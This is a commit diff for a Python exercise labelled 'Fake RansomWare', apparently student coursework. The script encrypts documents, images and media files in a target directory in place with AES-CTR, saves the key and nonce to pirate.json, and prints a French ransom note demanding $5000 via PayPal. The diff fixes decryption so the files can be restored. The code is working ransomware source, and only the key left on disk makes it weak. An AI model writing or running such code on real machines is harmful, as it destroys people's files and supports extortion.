Finished ex1(Fake RansomWare) and started ex2(Pwd Manager) parser

+++ ex1.py
@@ -7,8 +7,8 @@ import base64
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-d", "--directory", help="Target directory", default=os.getcwd())
-parser.add_argument("-op", "--operation", required=True, help="Operation type. Valid operation types are : enc, dec")
-parser.add_argument("-f", "--fileType", action="append", help="Target file types. Valid file types are : xls, doc, pdf, png, mp3, avi, txt")
+parser.add_argument("-op", "--operation", required=True, help="Operation type. Valid operation types are : enc, dec", choices=['enc', 'dec'])
+parser.add_argument("-f", "--fileType", action="append", help="Target file types. Valid file types are : xls, doc, pdf, png, mp3, avi, txt", choices=['xls', 'doc', 'pdf', 'png', 'mp3', 'avi', 'txt'])
 
 args = parser.parse_args()
 
@@ -28,10 +28,13 @@ if (args.operation == 'enc'):
 	key = get_random_bytes(16)
 	encryption_cipher = AES.new(key, AES.MODE_CTR)
 	with open(os.path.join(args.directory, "pirate.json"), 'w') as f:
+		keyEncry = str(base64.b64encode(key))
+		nonceEncry = str(base64.b64encode(encryption_cipher.nonce))
 		data_to_write = {
-			"key": str(base64.b64encode(key)),
+			"key": keyEncry,
 			"fileTypes": args.fileType,
-			"directory": args.directory
+			"directory": args.directory,
+			"nonce":nonceEncry
 		}
 		json.dump(data_to_write, f)
 		for file in foundFiles:
@@ -39,19 +42,19 @@ if (args.operation == 'enc'):
 				encrypted_content = encryption_cipher.encrypt(f.read())
 			with open(file, 'wb') as f:
 				f.write(encrypted_content)
+		print(encryption_cipher.nonce)
 		print("cet ordinateur est piraté, plusieurs fichiers ont été chiffrés,une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données")
-elif (args.operation == 'dec'):
+elif (args.operation == 'dec' and os.path.exists(os.path.join(args.directory, "pirate.json"))):
 	with open(os.path.join(args.directory, "pirate.json"), 'r') as f:
 		obj = json.load(f)
 		key = base64.b64decode(obj['key'][2:-1].encode('utf-8'))
-	encryption_cipher = AES.new(key, AES.MODE_CTR)
-	decryption_cipher = AES.new(key, AES.MODE_CTR, nonce=encryption_cipher.nonce)
+		nonce = base64.b64decode(obj['nonce'][2:-1].encode('utf-8'))
+	decryption_cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
 	for file in foundFiles:
 		with open(file, 'rb') as f:
 			decrypted_content = decryption_cipher.decrypt(f.read())
 		with open(file, 'wb') as f:
 			f.write(decrypted_content)
-		print(decrypted_content)
 	print("Vos fichiers sont maintenant décryptés. Merci de votre coopération financière")
 else:
-	raise(Exception("You must specify the operation type"))
+	raise(Exception("An error occured"))
